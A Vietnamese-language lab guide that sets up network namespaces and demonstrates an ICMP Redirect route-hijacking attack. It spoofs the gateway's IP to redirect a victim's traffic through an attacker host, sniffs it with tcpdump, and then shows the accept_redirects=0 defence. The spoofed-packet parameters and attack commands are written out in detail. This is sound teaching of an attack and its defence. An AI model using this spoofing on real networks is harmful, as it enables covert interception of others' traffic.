# HƯỚNG DẪN TRIỂN KHAI & PHÂN TÍCH KỸ THUẬT: LAB 05
## ICMP Redirect Attack (Route Hijacking / MITM)

---

### 1. MỤC TIÊU & MÔ HÌNH MẠNG

#### 1.1 Mục Tiêu & Cơ Sở Lý Thuyết
- **Bản chất giao thức ICMP Redirect (RFC 792 / RFC 1122):** Trong mô hình mạng chia sẻ môi trường truyền dẫn (Broadcast LAN), khi một Gateway nhận được gói tin từ máy trạm và nhận thấy cổng chuyển tiếp đi ra (outbound interface) lại trùng với cổng nhận vào (inbound interface), Gateway sẽ chuyển tiếp gói tin đồng thời gửi một thông điệp **ICMP Redirect (Type 5, Code 1 - Redirect for Host)** về máy trạm để thông báo một Nexthop tối ưu hơn nằm cùng subnet.
- **Lỗ hổng chiếm quyền định tuyến (Route Hijacking & MITM):** Thông điệp ICMP Redirect không có bất kỳ cơ chế chữ ký hay xác thực mật mã nào. Kernel của máy nạn nhân chỉ kiểm tra các điều kiện tiên quyết (theo RFC 1122 mục 3.2.2.2):
  1. Gói Redirect phải có IP nguồn trùng với Default Gateway hiện tại của tuyến đường.
  2. Địa chỉ Gateway mới phải nằm cùng subnet cục bộ.
  3. Gói Redirect phải chứa tiêu đề IP và tối thiểu 8 bytes đầu của gói tin dữ liệu nguyên bản (Original Datagram) khớp với một kết nối/socket đang hoạt động trên máy trạm.
- **Mối đe dọa:** Kẻ tấn công cùng subnet (`10.0.0.66`) có thể giả mạo IP của Gateway (`10.0.0.1`), gửi gói ICMP Redirect chỉ định chính mình làm Gateway mới cho máy chủ ngoài (`10.0.1.5`). Khi nạn nhân tin cậy và lưu vào bảng nhớ tạm (Route Cache / FIB Exception), toàn bộ lưu lượng tới đích ngoài sẽ chảy qua máy kẻ tấn công, biến kẻ tấn công thành Man-in-the-Middle (MITM).
- **Mục tiêu thực nghiệm trong Lab 05:**
  1. Xây dựng mô hình mạng 2 vùng (LAN `10.0.0.0/24` và WAN `10.0.1.0/24`) có router chuyển tiếp `gw`.
  2. Chế tạo gói tin ICMP Redirect giả mạo chứa luồng 4-tuple UDP đang hoạt động theo đúng chuẩn RFC 1122.
  3. Quan sát Route Cache trên `vic` được cập nhật cờ `<redirected> via 10.0.0.66`.
  4. Bật chuyển tiếp IP trên `atk` và bắt trọn lưu lượng ICMP/UDP của nạn nhân trên giao diện `atk0`.
  5. Cấu hình phòng thủ `accept_redirects = 0`, xóa cache và chứng minh hệ thống không bị bẻ lái tuyến đường.

#### 1.2 Topology Mạng & Quy Ước Thực Thi
- **Mô hình kết nối:**
  - Subnet LAN `10.0.0.0/24` (nối trên bridge `br0`):
    - `[VICTIM - vic]`: `10.0.0.2/24` trên `vic0`.
    - `[ROUTER / GATEWAY - gw]`: `10.0.0.1/24` trên `gw0`.
    - `[ATTACKER - atk]`: `10.0.0.66/24` trên `atk0`.
  - Subnet WAN `10.0.1.0/24` (kết nối điểm-điểm veth):
    - `[ROUTER / GATEWAY - gw]`: `10.0.1.254/24` trên `gw-d`.
    - `[MÁY CHỦ ĐÍCH - dst]`: `10.0.1.5/24` trên `d-gw`.

> 💡 **Quy ước thực thi lệnh:**
> - `[VICTIM - vic]`: Lệnh chạy trong namespace nạn nhân (tiền tố `ip netns exec vic`).
> - `[ATTACKER - atk]`: Lệnh chạy trong namespace kẻ tấn công (tiền tố `ip netns exec atk`).
> - `[ROUTER / GATEWAY - gw]`: Lệnh chạy trên router biên (tiền tố `ip netns exec gw`).
> - `[MÁY CHỦ ĐÍCH - dst]`: Lệnh chạy trên máy chủ đích (tiền tố `ip netns exec dst`).
> - `[HOST / CHUNG]`: Lệnh chạy trực tiếp trên máy ảo Kali.

---

### 2. BƯỚC 1: KHỞI TẠO THƯ MỤC VÀ TẠO CÁC SCRIPT

Trong bước này, ta chuẩn bị 2 tệp kịch bản tại `/tmp/lab05`:

#### 2.1 Kịch Bản `setup_redirect.sh` (Dual-subnet Routing Topology Setup)
- **Tại sao lại đặt tên như vậy?** Đặt tên là `setup_redirect` vì kịch bản này tạo toàn bộ hạ tầng mạng định tuyến đa subnet phục vụ riêng cho kịch bản tấn công ICMP Redirect.
- **Ý nghĩa của script:** Khởi tạo mạng LAN ảo kết nối qua bridge, kết nối router `gw` sang mạng WAN điểm-điểm, bật chuyển tiếp IP và thiết lập các biến kernel dễ bị tổn thương trên máy nạn nhân.
- **Ý chính của script làm gì?**
  1. Tạo Bridge `br0` cho LAN `10.0.0.0/24` với 3 trạm: `vic` (`10.0.0.2`), `gw` (`10.0.0.1`), `atk` (`10.0.0.66`).
  2. Tạo cặp veth nối router `gw` (`10.0.1.254`) sang máy đích `dst` (`10.0.1.5`).
  3. Cấu hình bảng định tuyến tĩnh: Default Gateway của `vic` và `atk` trỏ về `10.0.0.1`; Default Gateway của `dst` trỏ về `10.0.1.254`.
  4. Cấu hình biến nhân kernel trên `vic`:
     - `net.ipv4.conf.<dev>.accept_redirects = 1`
     - `net.ipv4.conf.<dev>.secure_redirects = 0` (Cho phép nhận redirect tới gateway bất kỳ trong subnet mà không bắt buộc gateway mới phải có trong danh sách route có sẵn).
  5. Cấu hình trên `gw`: `ip_forward = 1` và `send_redirects = 0` (để tránh router thật tự gửi redirect làm nhiễu thử nghiệm).
- **Móc nối lý thuyết (Theory Hook):**
  - Móc nối với **RFC 1122**: Máy trạm `vic` muốn gửi dữ liệu tới `10.0.1.5` phải thông qua gateway `10.0.0.1`. Khi bị lừa rằng `10.0.0.66` là nexthop tốt hơn cho host `10.0.1.5`, kernel `vic` sẽ lưu một ngoại lệ định tuyến (FIB Exception) để bỏ qua Default Gateway ban đầu.

#### 2.2 Kịch Bản `send_redirect.py` (ICMP Redirect Packet Crafter)
- **Tại sao lại đặt tên như vậy?** Tên gọi thể hiện chức năng tiêm (inject) gói tin ICMP Redirect đặc chế.
- **Ý nghĩa của script:** Khai thác lỗ hổng xác thực của giao thức ICMP để tiêm thông điệp chuyển hướng định tuyến giả mạo.
- **Ý chính của script làm gì?**
  1. Thiết lập IP nguồn gói tin là Gateway hợp pháp: `src = "10.0.0.1"`.
  2. Thiết lập IP đích là Nạn nhân: `dst = "10.0.0.2"`.
  3. Đóng gói tầng ICMP: `type = 5` (Redirect), `code = 1` (Redirect for Host), và địa chỉ Gateway mới là `gw = "10.0.0.66"`.
  4. **Điểm mấu chốt kỹ thuật:** Nhúng tiêu đề gói tin gốc (Original Datagram) khớp chính xác với luồng đang hoạt động của nạn nhân: `orig = IP(src="10.0.0.2", dst="10.0.1.5") / UDP(sport=12345, dport=80)`.
- **Móc nối lý thuyết (Theory Hook):**
  - Móc nối với cơ chế kiểm tra socket của Linux Kernel (`icmp_socket_deliver` / `__udp4_lib_lookup`): Nếu gói ICMP Redirect chỉ nhúng một gói tin giả định không có socket nào tương ứng đang mở trên máy nạn nhân, kernel sẽ drop gói tin đó ngay lập tức. Bằng cách đồng bộ hóa với một luồng UDP đang mở từ cổng `12345`, gói tin vượt qua khâu thẩm định của kernel nạn nhân 100%.

---

### 3. BƯỚC 2: CHẠY THIẾT LẬP MẠNG & XÁC NHẬN BASELINE ROUTE

Thực thi kịch bản thiết lập và kiểm tra đường đi ban đầu:

```bash
# [HOST / CHUNG] Thiết lập topology mạng LAN bridge & WAN
sudo bash /tmp/lab05/setup_redirect.sh

# [VICTIM - vic] Kiểm tra đường đi ban đầu trên vic:
sudo ip netns exec vic ip route get 10.0.1.5
```

#### Phân Tích Cú Pháp & Các Lệnh Quan Trọng:
1. `ip route get <IP>`:
   - Tra cứu trực tiếp bảng định tuyến chuyển tiếp (FIB - Forwarding Information Base) của kernel đối với một địa chỉ đích cụ thể.
   - **Kết quả baseline kỳ vọng:**
     ```text
     10.0.1.5 via 10.0.0.1 dev vic0 src 10.0.0.2 uid 0
         cache
     ```
     Xác nhận mọi lưu lượng đi `10.0.1.5` đều đi qua Gateway chuẩn `10.0.0.1`.

---

### 4. BƯỚC 3: PHÁT ĐỘNG TẤN CÔNG & BẺ LÁI ĐỊNH TUYẾN

Thực hiện kịch bản phối hợp: Bật MITM forwarding $\rightarrow$ Mở Sniffer trên Attacker $\rightarrow$ Kích hoạt luồng UDP trên Victim và tiêm gói Redirect:

```bash
# 1. [ATTACKER - atk] Bật IP Forwarding trên atk để đóng vai trò Man-in-the-Middle
sudo ip netns exec atk sysctl -w net.ipv4.ip_forward=1

# 2. [ATTACKER - atk] Mở tcpdump trên atk0 đón bắt lưu lượng bị bẻ lái
sudo ip netns exec atk tcpdump -i atk0 -nn host 10.0.1.5 > /tmp/lab05/tcpdump_mitm.log 2>&1 &
sleep 1

# 3. [VICTIM / ATTACKER] Mở socket UDP trên vic và tiêm gói ICMP Redirect từ atk
# [VICTIM - vic]
sudo ip netns exec vic python3 -c '
import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("10.0.0.2", 12345))
s.connect(("10.0.1.5", 80))
s.send(b"hello")
time.sleep(1.5)
' &
sleep 0.3
# [ATTACKER - atk]
sudo ip netns exec atk python3 /tmp/lab05/send_redirect.py
sleep 1

# 4. [VICTIM - vic] Kiểm tra bảng định tuyến trên vic ngay sau khi tiêm gói
sudo ip netns exec vic ip route get 10.0.1.5

# 5. [VICTIM / ATTACKER] Từ vic, gửi ping thử tới 10.0.1.5 để quan sát lưu lượng qua attacker
# [VICTIM - vic]
sudo ip netns exec vic ping -c 2 10.0.1.5
sleep 2
# [ATTACKER - atk]
cat /tmp/lab05/tcpdump_mitm.log
```

#### Phân Tích Cú Pháp & Các Lệnh Quan Trọng:
1. `python3 -c '...' &`:
   - Mở một socket UDP gắn vào cổng nguồn `12345` (`s.bind`) và kết nối tới `10.0.1.5:80` (`s.connect`), gửi một mẩu tin nhỏ để kích hoạt trạng thái kết nối trong kernel. `time.sleep(1.5)` giữ socket này sống trong 1.5 giây để khớp với thời điểm gói ICMP Redirect bay tới.
2. `ip route get 10.0.1.5` sau khi tấn công:
   - **Kết quả thu được thực tế:**
     ```text
     10.0.1.5 via 10.0.0.66 dev vic0 src 10.0.0.2 uid 0
         cache <redirected> expires 295sec
     ```
   - **Phân tích nhãn `<redirected>`:** Kernel của `vic` đã chính thức ghi nhận thông báo chuyển hướng! Trường `via 10.0.0.66` thay thế hoàn toàn cho `10.0.0.1`. Tuyến đường ngoại lệ này được lưu tạm trong bộ nhớ đệm FIB với thời gian hết hạn là 300 giây (`expires 295sec`).
3. **Phân tích nhật ký MITM trên `atk` (`tcpdump_mitm.log`):**
   ```text
   11:50:15.123456 IP 10.0.0.2 > 10.0.1.5: ICMP echo request, id 5123, seq 1, length 64
   11:50:16.123789 IP 10.0.0.2 > 10.0.1.5: ICMP echo request, id 5123, seq 2, length 64
   ```
   Dù nạn nhân gửi ping tới địa chỉ WAN `10.0.1.5`, toàn bộ gói tin vật lý đều đi qua card mạng `atk0` của kẻ tấn công. Vì `atk` đã bật `ip_forward = 1`, kẻ tấn công có thể vừa âm thầm nghe lén (sniff) vừa chuyển tiếp gói tin về đích thật mà người dùng không hề hay biết!

---

### 5. BƯỚC 4: KÍCH HOẠT PHÒNG THỦ & KIỂM CHỨNG LẠI

Triển khai cấu hình phòng thủ và dọn sạch bộ đệm bị nhiễm độc:

```bash
# 1. [VICTIM - vic] Tắt tính năng chấp nhận ICMP Redirect và xóa cache bị nhiễm độc
for k in all default vic0; do
    sudo ip netns exec vic sysctl -w net.ipv4.conf.$k.accept_redirects=0
done
sudo ip netns exec vic ip route flush cache

# 2. [ATTACKER - atk] Tiêm lại gói ICMP Redirect từ atk
sudo ip netns exec atk python3 /tmp/lab05/send_redirect.py
sleep 1

# 3. [VICTIM - vic] Kiểm tra lại bảng định tuyến của vic
sudo ip netns exec vic ip route get 10.0.1.5
```

#### Phân Tích Cơ Chế Phòng Thủ:
1. `sysctl -w net.ipv4.conf.$k.accept_redirects=0`:
   - Vô hiệu hóa tính năng chấp nhận gói tin ICMP Redirect trên toàn bộ các giao diện của máy trạm.
2. `ip route flush cache`:
   - Lệnh quan trọng trong quản trị Linux: Xóa sạch toàn bộ các mục FIB Exception và Route Cache tạm thời đang lưu trong bộ nhớ RAM của kernel.
3. **Kết quả kiểm tra lại:**
   ```text
   10.0.1.5 via 10.0.0.1 dev vic0 src 10.0.0.2 uid 0
       cache
   ```
   Tuyến đường giữ nguyên vẹn `via 10.0.0.1`, hoàn toàn không xuất hiện nhãn `<redirected>`. Kernel máy nạn nhân đã drop gói tin Redirect giả mạo ngay từ cổng vào, ngăn chặn triệt để nguy cơ bị chiếm đoạt định tuyến.

---

### 6. BƯỚC 5: DỌN DẸP MÔI TRƯỜNG

Khôi phục hệ thống:

```bash
# [HOST / CHUNG] Tắt tiến trình nền và xóa môi trường lab
sudo pkill -f tcpdump 2>/dev/null || true
for ns in vic gw atk dst; do sudo ip netns del $ns 2>/dev/null || true; done
sudo ip link del br0 2>/dev/null || true
sudo rm -rf /tmp/lab05
```

- Xóa toàn bộ 4 namespaces (`vic`, `gw`, `atk`, `dst`), bridge `br0` và thư mục tạm `/tmp/lab05`.

